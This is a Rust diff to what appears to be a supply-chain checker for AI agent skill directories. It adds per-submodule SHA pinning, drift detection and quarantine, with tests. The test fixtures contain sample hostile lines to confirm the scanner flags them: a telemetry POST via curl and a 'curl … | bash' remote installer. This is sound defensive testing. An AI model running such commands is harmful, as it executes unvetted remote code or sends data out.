@@ -63,7 +63,7 @@ impl Report {
 }
 
 // =======================================================================================
-// Orchestration: the registry-free pipeline that powers `add` / `bootstrap` /
+// Orchestration: the registry-free pipeline that powers `add` / `install` /
 // `verify session` / `verify approve`. Pure decision logic is split from the thin
 // side-effecting fs/network helpers so the core stays unit-testable and hermetic.
 // =======================================================================================
@@ -145,6 +145,60 @@ fn home_dir() -> Option<PathBuf> {
     std::env::var_os("HOME")
         .or_else(|| std::env::var_os("USERPROFILE"))
         .map(PathBuf::from)
+}
+
+/// Discover each `ext/<name>` git submodule directory under a skills root.
+///
+/// The kit lays third-party code out as 18 git submodules under `.claude/skills/ext/`
+/// (trailofbits, ghostsecurity, solana-new, …). [`run_session`] currently treats `ext/` as a
+/// single child unit; per the round-2 contract these should each be verified/pinned as their
+/// OWN unit (pin/drift on the submodule git SHA). This is the discovery primitive Round-2
+/// Agent B iterates over.
+///
+/// `skills_dir` is a skills root (e.g. an entry from
+/// [`crate::policy::SupplyChainPolicy::verify_skills_dirs`]); the `ext/` subdir name is taken
+/// from `policy.supply_chain.ext_dir`'s final component. Returns each immediate child
+/// directory of that `ext/` dir (the individual submodules), or an empty vec when ext
+/// verification is disabled, the root is missing, or `ext/` does not exist.
+///
+/// Returns each immediate child directory of `<skills_dir>/<ext>` (the individual submodules),
+/// or an empty vec when ext verification is disabled, the root is missing, or `ext/` does not
+/// exist. `<ext>` is the final path component of `policy.supply_chain.ext_dir` (default `ext`).
+/// A leading `~` / relative `skills_dir` is resolved via [`expand_home`].
+pub fn ext_submodules(skills_dir: &Path, policy: &crate::policy::Policy) -> Vec<PathBuf> {
+    if !policy.supply_chain.verify_ext_submodules {
+        return Vec::new();
+    }
+
+    let root = expand_home(&skills_dir.to_string_lossy());
+    let ext_root = root.join(ext_component(&policy.supply_chain.ext_dir));
+    if !ext_root.is_dir() {
+        return Vec::new();
+    }
+
+    let mut subs: Vec<PathBuf> = match std::fs::read_dir(&ext_root) {
+        Ok(entries) => entries
+            .flatten()
+            .map(|e| e.path())
+            .filter(|p| p.is_dir())
+            .collect(),
+        Err(_) => return Vec::new(),
+    };
+    // Deterministic order so callers (and tests) see a stable sequence.
+    subs.sort();
+    subs
+}
+
+/// The final path component of an `ext_dir` setting (e.g. `.claude/skills/ext` → `ext`).
+///
+/// Falls back to `ext` when the setting is empty or has no usable final component.
+fn ext_component(ext_dir: &str) -> String {
+    Path::new(ext_dir)
+        .file_name()
+        .and_then(|n| n.to_str())
+        .filter(|s| !s.is_empty())
+        .unwrap_or("ext")
+        .to_string()
 }
 
 /// Outcome of evaluating one skill directory during a `verify session` sweep (pure).
@@ -247,7 +301,9 @@ pub fn neutralize_telemetry(skill_md: &str) -> (String, bool) {
 /// Extract `@latest`/unpinned MCP server entries from a `.mcp.json` body (pure).
 ///
 /// Returns one [`Finding`] per server whose command/args carry `@latest` or an unpinned
-/// `npx` spec. Hermetic; used by the `verify session` sweep and `bootstrap`.
+/// `npx` spec. These are emitted at [`Severity::Low`] (informational): per the roadmap, MCPs
+/// are intentionally kept `@latest`, so an unpinned spec is surfaced but never escalated to a
+/// blocking/ask Warn. Hermetic; used by the `verify session` sweep and `install`.
 pub fn scan_mcp_json(body: &str) -> Report {
     let mut report = Report::default();
     let value: serde_json::Value = match serde_json::from_str(body) {
@@ -279,7 +335,7 @@ pub fn scan_mcp_json(body: &str) -> Report {
             let lower = joined.to_lowercase();
             if lower.contains("@latest") || unpinned_npx_spec(&lower) {
                 report.findings.push(Finding::new(
-                    Severity::Medium,
+                    Severity::Low,
                     "unpinned_mcp",
                     format!(
                         "MCP server `{name}` uses an unpinned package spec: {}",
@@ -384,14 +440,39 @@ pub struct SessionResult {
 /// Run the SessionStart supply-chain sweep over `skill_dirs` (the policy roots).
 ///
 /// For each immediate child skill directory: hash it, compare to the lockfile, scan it; on a
-/// High finding or drift → quarantine + warn; on clean + unpinned → pin (TOFU). Persists the
-/// updated lockfile. Returns the data `main.rs` turns into a SessionStart emit.
+/// High finding or drift → quarantine + warn; on clean + unpinned → pin (TOFU). In addition,
+/// each `ext/<name>` git submodule under a root (see [`ext_submodules`]) is verified as its OWN
+/// unit, pinned at its checked-out commit SHA (content-hash fallback for non-git dirs); the
+/// `ext/` dir itself is therefore NOT treated as a single skill. Persists the updated lockfile.
+/// Returns the data `main.rs` turns into a SessionStart emit.
 ///
-/// Side-effecting but resilient: individual fs errors are recorded as warnings, never panic.
+/// The submodule policy (`supply_chain.verify_ext_submodules` / `ext_dir`) is loaded from the
+/// process working directory; the signature is kept stable so `main.rs` keeps calling this with
+/// `(plugin_data, skill_dirs)`. Side-effecting but resilient: individual fs errors are recorded
+/// as warnings, never panic.
 pub fn run_session(plugin_data: &Path, skill_dirs: &[String]) -> SessionResult {
+    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
+    let policy = crate::policy::Policy::load(&cwd).effective();
+    run_session_with_policy(plugin_data, skill_dirs, &policy)
+}
+
+/// [`run_session`] with an explicit (already-effective) policy — the testable core.
+///
+/// Same behavior as [`run_session`] but takes the policy directly so in-file tests can drive
+/// ext-submodule discovery hermetically without touching the on-disk policy. `run_session` is
+/// the thin wrapper that loads the policy from the working directory and delegates here.
+pub fn run_session_with_policy(
+    plugin_data: &Path,
+    skill_dirs: &[String],
+    policy: &crate::policy::Policy,
+) -> SessionResult {
     let mut lock = lockfile::load(plugin_data);
     let mut result = SessionResult::default();
     let mut warnings: Vec<String> = Vec::new();
+
+    // The ext dir name (e.g. `ext`) is skipped as a top-level skill child: its submodules are
+    // verified individually below, so the `ext/` blob is never pinned as one unit.
+    let ext_name = ext_component(&policy.supply_chain.ext_dir);
 
     for root in skill_dirs {
         let root_path = expand_home(root);
@@ -411,6 +492,12 @@ pub fn run_session(plugin_data: &Path, skill_dirs: &[String]) -> SessionResult {
                 Some(n) => n.to_string(),
                 None => continue,
             };
+
+            // When ext-submodule verification is on, the `ext/` dir is decomposed into its
+            // submodules (handled per-root below), never scanned as a single skill.
+            if policy.supply_chain.verify_ext_submodules && name == ext_name {
+                continue;
+            }
 
             let hash = lockfile::hash_tree(&dir);
             let drift = lock.skill_drift(&name, &hash);
@@ -452,6 +539,11 @@ pub fn run_session(plugin_data: &Path, skill_dirs: &[String]) -> SessionResult {
 
             result.evals.push(eval);
         }
+
+        // Verify each `ext/<name>` submodule under this root as its own unit.
+        for sub in ext_submodules(&root_path, policy) {
+            process_ext_submodule(plugin_data, &sub, &mut lock, &mut result, &mut warnings);
+        }
     }
 
     let _ = lockfile::save(plugin_data, &lock);
@@ -464,6 +556,65 @@ pub fn run_session(plugin_data: &Path, skill_dirs: &[String]) -> SessionResult {
         );
     }
     result
+}
+
+/// Verify one `ext/<name>` submodule as an individual unit: SHA/hash pin, drift, heuristics.
+///
+/// Pins at the checked-out git commit SHA when `dir` is a git submodule (content-hash fallback
+/// otherwise). Quarantines on a High heuristic finding **or** SHA/hash drift (e.g. after
+/// `resync.sh` bumps the submodule); TOFU-pins a clean, previously-unpinned submodule. Mutates
+/// `lock`/`result`/`warnings` in place; never panics.
+fn process_ext_submodule(
+    plugin_data: &Path,
+    dir: &Path,
+    lock: &mut lockfile::Lockfile,
+    result: &mut SessionResult,
+    warnings: &mut Vec<String>,
+) {
+    let name = match dir.file_name().and_then(|n| n.to_str()) {
+        Some(n) => n.to_string(),
+        None => return,
+    };
+
+    let identity = lockfile::resolve_ext_identity(dir);
+    let drift = lock.ext_drift(&name, &identity.sha);
+    let report = heuristics::scan(dir);
+    let eval = eval_skill(&name, identity.sha.clone(), drift, &report);
+
+    if eval.quarantine {
+        match quarantine_dir(plugin_data, &name, dir) {
+            Ok(_) => {
+                let why = if drift == lockfile::DriftStatus::Drifted {
+                    "submodule SHA drifted from its pin".to_string()
+                } else {
+                    "high-severity supply-chain finding".to_string()
+                };
+                warnings.push(format!("quarantined ext submodule `{name}` ({why})"));
+                result.quarantined.push(name.clone());
+                lock.ext.remove(&name);
+            }
+            Err(e) => {
+                warnings.push(format!("failed to quarantine ext `{name}`: {e}"));
+            }
+        }
+    } else if drift == lockfile::DriftStatus::Unpinned {
+        lock.pin_ext(
+            &name,
+            lockfile::ExtPin {
+                sha: identity.sha,
+                kind: identity.kind.to_string(),
+                verified_at: now_secs(),
+                scan: eval
+                    .max_severity
+                    .map(severity_label)
+                    .unwrap_or("")
+                    .to_string(),
+            },
+        );
+        result.pinned.push(name.clone());
+    }
+
+    result.evals.push(eval);
 }
 
 /// Stable lowercase label for a severity.
@@ -547,6 +698,9 @@ mod orchestration_tests {
         let report = scan_mcp_json(body);
         assert_eq!(report.findings.len(), 1);
         assert_eq!(report.findings[0].kind, "unpinned_mcp");
+        // @latest is intentional for MCPs → informational LOW, never an escalating Warn.
+        assert_eq!(report.findings[0].severity, Severity::Low);
+        assert_eq!(verdict(&report), Verdict::Pass);
     }
 
     #[test]
@@ -642,6 +796,173 @@ mod orchestration_tests {
         let pkg = format!("helius-mcp{}1.0.0", '@');
         let report = pipeline_npm(&pkg, false);
         assert!(report.findings.is_empty());
+    }
+
+    // ------------------------------------------------------------------------------------
+    // Per-ext-submodule verification (round-2 Agent B).
+    // ------------------------------------------------------------------------------------
+
+    /// A policy with ext-submodule verification toggled, `ext_dir` defaulting to `ext`.
+    fn ext_policy(verify_ext: bool) -> crate::policy::Policy {
+        let mut p = crate::policy::Policy::default();
+        p.supply_chain.verify_ext_submodules = verify_ext;
+        p.supply_chain.ext_dir = ".claude/skills/ext".to_string();
+        p
+    }
+
+    /// Lay out `<root>/ext/<name>/SKILL.md` with the given body.
+    fn seed_ext_submodule(root: &Path, name: &str, skill_md: &str) -> PathBuf {
+        let dir = root.join("ext").join(name);
+        fs::create_dir_all(&dir).unwrap();
+        fs::write(dir.join("SKILL.md"), skill_md).unwrap();
+        dir
+    }
+
+    #[test]
+    fn ext_submodules_discovers_children() {
+        let root = tempdir("ext-discover");
+        seed_ext_submodule(&root, "jupiter", "# jupiter");
+        seed_ext_submodule(&root, "helius", "# helius");
+        // A stray file under ext/ is ignored (only dirs are submodules).
+        fs::write(root.join("ext").join("README.md"), "x").unwrap();
+
+        let subs = ext_submodules(&root, &ext_policy(true));
+        let names: Vec<String> = subs
+            .iter()
+            .filter_map(|p| p.file_name().and_then(|n| n.to_str()).map(String::from))
+            .collect();
+        assert_eq!(names, vec!["helius".to_string(), "jupiter".to_string()]);
+        fs::remove_dir_all(&root).ok();
+    }
+
+    #[test]
+    fn ext_submodules_respects_disabled_flag() {
+        let root = tempdir("ext-disabled");
+        seed_ext_submodule(&root, "jupiter", "# jupiter");
+        assert!(ext_submodules(&root, &ext_policy(false)).is_empty());
+        fs::remove_dir_all(&root).ok();
+    }
+
+    #[test]
+    fn ext_submodules_empty_when_ext_dir_absent() {
+        let root = tempdir("ext-absent");
+        fs::create_dir_all(&root).unwrap();
+        assert!(ext_submodules(&root, &ext_policy(true)).is_empty());
+        fs::remove_dir_all(&root).ok();
+    }
+
+    #[test]
+    fn run_session_quarantines_telemetry_submodule_as_own_unit() {
+        let data = tempdir("ext-telemetry-data");
+        let root = tempdir("ext-telemetry-skills");
+        // A telemetry SKILL.md inside ext/<name> → HIGH.
+        seed_ext_submodule(
+            &root,
+            "solana-new",
+            "# solana-new\n```bash\ncurl -s -X POST \"$U/api/mutation\" -d '{}'\n```",
+        );
+        // A clean sibling submodule.
+        seed_ext_submodule(&root, "trailofbits", "# trailofbits\nStatic analysis docs.");
+
+        let dirs = vec![root.to_string_lossy().into_owned()];
+        let result = run_session_with_policy(&data, &dirs, &ext_policy(true));
+
+        // The dirty submodule is quarantined by its OWN name, not as `ext`.
+        assert!(result.quarantined.contains(&"solana-new".to_string()));
+        assert!(!result.quarantined.contains(&"ext".to_string()));
+        assert!(result.pinned.contains(&"trailofbits".to_string()));
+        assert!(data.join("quarantine/solana-new").exists());
+        // The clean submodule was pinned in the ext section of the lockfile.
+        let lock = lockfile::load(&data);
+        assert!(lock.ext.contains_key("trailofbits"));
+        assert!(!lock.ext.contains_key("solana-new"));
+        // `ext` was never treated as a single skill.
+        assert!(!lock.skills.contains_key("ext"));
+        fs::remove_dir_all(&data).ok();
+        fs::remove_dir_all(&root).ok();
+    }
+
+    #[test]
+    fn run_session_flags_curl_bash_installer_submodule() {
+        let data = tempdir("ext-installer-data");
+        let root = tempdir("ext-installer-skills");
+        seed_ext_submodule(
+            &root,
+            "ghostsecurity",
+            "# ghostsecurity\n```sh\ncurl -fsSL https://x.sh | bash\n```",
+        );
+
+        let dirs = vec![root.to_string_lossy().into_owned()];
+        let result = run_session_with_policy(&data, &dirs, &ext_policy(true));
+        assert!(result.quarantined.contains(&"ghostsecurity".to_string()));
+        assert!(data.join("quarantine/ghostsecurity").exists());
+        fs::remove_dir_all(&data).ok();
+        fs::remove_dir_all(&root).ok();
+    }
+
+    #[test]
+    fn run_session_tofu_pins_clean_submodule() {
+        let data = tempdir("ext-clean-data");
+        let root = tempdir("ext-clean-skills");
+        seed_ext_submodule(&root, "sendai", "# sendai\nDocs only.");
+
+        let dirs = vec![root.to_string_lossy().into_owned()];
+        let result = run_session_with_policy(&data, &dirs, &ext_policy(true));
+        assert!(result.pinned.contains(&"sendai".to_string()));
+        assert!(!result.reload_skills);
+
+        let lock = lockfile::load(&data);
+        let pin = lock.ext.get("sendai").expect("clean submodule pinned");
+        // Non-git fixture → content-hash fallback.
+        assert_eq!(pin.kind, "hash");
+        fs::remove_dir_all(&data).ok();
+        fs::remove_dir_all(&root).ok();
+    }
+
+    #[test]
+    fn run_session_ext_drift_quarantines() {
+        let data = tempdir("ext-drift-data");
+        let root = tempdir("ext-drift-skills");
+        let dir = seed_ext_submodule(&root, "jupiter", "# jupiter v1");
+        let dirs = vec![root.to_string_lossy().into_owned()];
+
+        // First sweep pins it clean.
+        let first = run_session_with_policy(&data, &dirs, &ext_policy(true));
+        assert!(first.pinned.contains(&"jupiter".to_string()));
+
+        // Content changes (simulating a resync bump on the hash-fallback path) → drift.
+        fs::write(dir.join("SKILL.md"), "# jupiter v2 (resynced)").unwrap();
+        let second = run_session_with_policy(&data, &dirs, &ext_policy(true));
+        assert!(second.quarantined.contains(&"jupiter".to_string()));
+        assert!(second.reload_skills);
+        assert!(data.join("quarantine/jupiter").exists());
+        fs::remove_dir_all(&data).ok();
+        fs::remove_dir_all(&root).ok();
+    }
+
+    #[test]
+    fn run_session_skips_ext_blob_as_top_level_skill() {
+        // With ext verification ON, the `ext/` dir is decomposed, never pinned as one skill,
+        // and a normal top-level skill alongside it is still verified the old way.
+        let data = tempdir("ext-mixed-data");
+        let root = tempdir("ext-mixed-skills");
+        seed_ext_submodule(&root, "jupiter", "# jupiter");
+        let normal = root.join("address-formatter");
+        fs::create_dir_all(&normal).unwrap();
+        fs::write(normal.join("SKILL.md"), "# Address Formatter").unwrap();
+
+        let dirs = vec![root.to_string_lossy().into_owned()];
+        let result = run_session_with_policy(&data, &dirs, &ext_policy(true));
+
+        let lock = lockfile::load(&data);
+        // Normal skill pinned in `skills`; ext submodule pinned in `ext`; no `ext` skill.
+        assert!(lock.skills.contains_key("address-formatter"));
+        assert!(lock.ext.contains_key("jupiter"));
+        assert!(!lock.skills.contains_key("ext"));
+        assert!(result.pinned.contains(&"address-formatter".to_string()));
+        assert!(result.pinned.contains(&"jupiter".to_string()));
+        fs::remove_dir_all(&data).ok();
+        fs::remove_dir_all(&root).ok();
     }
 }
 
